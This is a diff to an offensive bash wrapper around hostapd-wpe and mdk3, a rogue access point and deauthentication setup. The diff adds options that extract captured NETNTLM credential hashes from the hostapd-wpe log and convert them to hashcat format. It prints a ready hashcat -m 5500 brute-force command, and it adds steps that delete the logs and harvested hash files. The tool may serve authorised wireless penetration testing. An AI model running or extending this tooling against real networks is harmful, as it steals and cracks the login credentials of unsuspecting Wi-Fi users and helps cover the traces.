@@ -18,11 +18,16 @@ hostapd_conf="/etc/hostapd-wpe/hostapd-wpe.conf"
 log_dir="/var/log"
 deauth_channels="1,2,3,4,5,6,7,8,9,10,11,12"
 whitelist_file="/root/whitelist"
+hashcat_hashes_file="/tmp/netntlmv1-hashes.txt"
+netntlm_hashes_file="/tmp/hostapd-wpe-hashes.txt"
 
 start=NO
 karma=NO
 kill=NO
 check=NO
+netntlm=NO
+netntlm_hashcat=NO
+delete_log=NO
 help=NO
 
 function usage {
@@ -59,6 +64,9 @@ Optional arguments:
   -k, --karma           Set Karma mode for hostapd-wpe
   -K, --kill            Kill mdk3 and hostapd-wpe process
   -C, --check           Check mdk3 and hostapd-wpe process
+  -N, --netntlm         Print unique users with NETNTLM hashes
+  -H, --netntlm-hashcat Print unique users with NETNTLM hashes (hashcat format)
+  -D, --delete-log      Delete log files
 EOF
 }
 
@@ -114,6 +122,18 @@ case $key in
     check=YES
     shift # past argument
     ;;
+    -N|--netntlm)
+    netntlm=YES
+    shift # past argument
+    ;;
+    -H|--netntlm-hashcat)
+    netntlm_hashcat=YES
+    shift # past argument
+    ;;
+    -D|--delete-log)
+    delete_log=YES
+    shift # past argument
+    ;;
     -h|--help)
     usage
     exit 0
@@ -125,6 +145,47 @@ case $key in
 esac
 done
 set -- "${POSITIONAL[@]}" # restore positional parameters
+
+if [[ $netntlm == "YES" ]]
+then
+    cat ${log_dir}/hostapd-wpe.log | grep "jtr NETNTLM" | awk '{print $3}' | sort -u -t: -k1,1 >${netntlm_hashes_file}
+    if [ -s "$netntlm_hashes_file" ]
+    then
+        echo -e "${SUCESS}$(wc -l $netntlm_hashes_file) unique users with NETNTLM hashes:"
+        cat ${netntlm_hashes_file}
+        echo -e "${INFO}Save NETNTLM hashes to file: ${netntlm_hashes_file}"
+    else
+        echo -e "${ERROR}Not found NETNTLM hashes in hostapd-wpe log: ${log_dir}/hostapd-wpe.log"
+    fi
+    exit 0
+fi
+
+if [[ $netntlm_hashcat == "YES" ]]
+then
+    cat ${log_dir}/hostapd-wpe.log | grep "jtr NETNTLM" | awk '{print $3}' | sort -u -t: -k1,1 | sed 's/\$NETNTLM//g' | sed 's/\$/ /g' | awk '{print $1":::"$3":"$2}' >${hashcat_hashes_file}
+    if [ -s "$hashcat_hashes_file" ]
+    then
+        echo -e "${SUCESS}$(wc -l $hashcat_hashes_file) unique users with NETNTLM hashes (hashcat format):"
+        cat ${hashcat_hashes_file}
+        echo -e "${INFO}Save NETNTLM hashes (hashcat format) to file: ${hashcat_hashes_file}"
+        echo -e "${INFO}Brute command: hashcat -m 5500 ${hashcat_hashes_file} password_list.txt"
+    else
+        echo -e "${ERROR}Not found NETNTLM hashes in hostapd-wpe log: ${log_dir}/hostapd-wpe.log"
+        rm -f ${hashcat_hashes_file}
+    fi
+    exit 0
+fi
+
+if [[ $delete_log == "YES" ]]
+then
+    echo -e "${INFO}Delete log files ..."
+    rm -f ${log_dir}/hostapd-wpe.log
+    rm -f ${log_dir}/death.log
+    rm -f ${whitelist_file}
+    rm -f ${netntlm_hashes_file}
+    rm -f ${hashcat_hashes_file}
+    exit 0
+fi
 
 if [[ $check == "YES" ]]
 then
@@ -154,6 +215,9 @@ then
     echo -e "${INFO}Kill hostapd_wpe and mdk3 ..."
     kill -9 `pgrep mdk3` >/dev/null 2>&1
     kill -9 `pgrep hostapd-wpe` >/dev/null 2>&1
+    rm -f ${whitelist_file}
+    rm -f ${netntlm_hashes_file}
+    rm -f ${hashcat_hashes_file}
     exit 0
 fi
 
